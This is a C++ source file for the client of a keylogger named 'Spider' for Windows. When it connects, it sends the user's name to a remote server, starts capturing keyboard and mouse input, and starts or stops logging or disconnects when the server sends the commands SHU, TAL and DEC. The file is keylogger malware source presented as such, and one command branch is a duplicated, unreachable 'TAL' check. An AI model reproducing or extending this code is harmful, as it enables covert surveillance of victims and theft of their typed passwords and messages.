#include "client\ClientSpider.hpp"

#include <time.h>

namespace spider
{
	ClientSpider::ClientSpider(LPVOID param) : _mtx(sock.getQMtx()), _rdQ(sock.getRdQ())
	{
		inputHandler = new WindowsInputHandler(param);
		GetUserName((TCHAR*)userName, &userNameLength);
	}

	ClientSpider::~ClientSpider()
	{
		delete inputHandler;
		char *tmp;
		while (tmp = _rdQ.front())
		{
			free(tmp);
			_rdQ.pop();
		}
	}

	bool ClientSpider::testConnection()
	{
		if (sock.startedService())
		{
			//sock.otherWrite("client keylogger\n");
			return true;
		}
		return false;
	}

	bool ClientSpider::protocolConnection()
	{
		PackageCMDIDN packetStruct;
		strncpy(packetStruct.cmd, "IDN", 3);
		packetStruct.id = RANDOM_ID;
		strcpy(packetStruct.key, userName);

		if (sock.startedService())
		{
			sock.write<PackageCMDIDN>(spider::PacketSerializer<PackageCMDIDN>(
				sizeof(PackageHeader) + sizeof(PackageCMDIDN), RANDOM_ID, packetStruct));
			return true;
		}
		return false;
	}

	char *ClientSpider::getMessageFromServer()
	{
		char *tmp;

		_mtx->lock();
		if (_rdQ.empty() == false)
		{
			tmp = _rdQ.front();
			_rdQ.pop();
		}
		else
		{
			tmp = NULL;
		}
		_mtx->unlock();
		return tmp;
	}

	int ClientSpider::run()
	{
		protocolConnection();
		inputHandler->startLogging(true, true);

		PackageAnswer2 answer;

		MSG message;
		while (GetMessage(&message, NULL, 0, 0))
		{
			if (message.lParam)
			{
				if (!strncmp((char*)message.lParam, "SHU", 3))
				{
					if (!inputHandler->stopLogging(true, true))
					{
						answer.code = 302;
						strncpy(answer.cmd, "SHU", 3);
					}
					else
					{
						answer.code = 103;
						strncpy(answer.cmd, "SHU", 3);
					}
					sock.write<PackageAnswer2>(spider::PacketSerializer<PackageAnswer2>(
						sizeof(PackageHeader) + sizeof(PackageAnswer2), 666, answer));
				}
				else if (!strncmp((char*)message.lParam, "TAL", 3))
				{
					inputHandler->startLogging(true, true);
					answer.code = 302;
					strncpy(answer.cmd, "TAL", 3);
					sock.write<PackageAnswer2>(spider::PacketSerializer<PackageAnswer2>(
						sizeof(PackageHeader) + sizeof(PackageAnswer2), 666, answer));
				}
				else if (!strncmp((char*)message.lParam, "TAL", 3))
				{
					answer.code = 208;
					strncpy(answer.cmd, "DEC", 3);
					sock.write<PackageAnswer2>(spider::PacketSerializer<PackageAnswer2>(
						sizeof(PackageHeader) + sizeof(PackageAnswer2), 666, answer));
					sock.close();
				}
			}
			TranslateMessage(&message);
			DispatchMessage(&message);
		}

		//while (1)
		//{
		//	SLEEPMS(1);
		//}
		return 0;
	}
}
